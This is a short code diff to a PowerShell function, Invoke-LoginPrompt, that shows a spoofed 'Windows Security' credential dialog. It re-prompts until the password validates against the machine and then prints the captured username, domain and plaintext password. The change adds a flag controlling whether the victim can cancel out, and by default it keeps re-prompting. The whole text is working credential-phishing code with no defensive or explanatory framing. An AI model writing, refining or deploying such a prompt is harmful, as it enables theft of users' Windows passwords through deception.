@@ -19,6 +19,7 @@ Function Invoke-LoginPrompt {
     $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)
     $InitialPrompt = "Please enter user credentials"
     $RetryPrompt = "Invalid credentials. Please try again"
+    $BailOutOnCancel = $False
     Do {
         $password = ""
         $cred = $Host.ui.PromptForCredential("Windows Security", $(If ($cred) {$RetryPrompt} Else {$InitialPrompt}), "$env:userdomain\$env:username","")
@@ -29,6 +30,8 @@ Function Invoke-LoginPrompt {
             $domain = $netcred.UserName
             $full = "$domain" + "\" + "$username"
             $password = $netcred.password
+        } ElseIf ($BailOutOnCancel) {
+            Return
         }
     } While($DS.ValidateCredentials("$full", "$password") -ne $True)
     $cred.GetNetworkCredential() | Select-Object UserName, Domain, Password
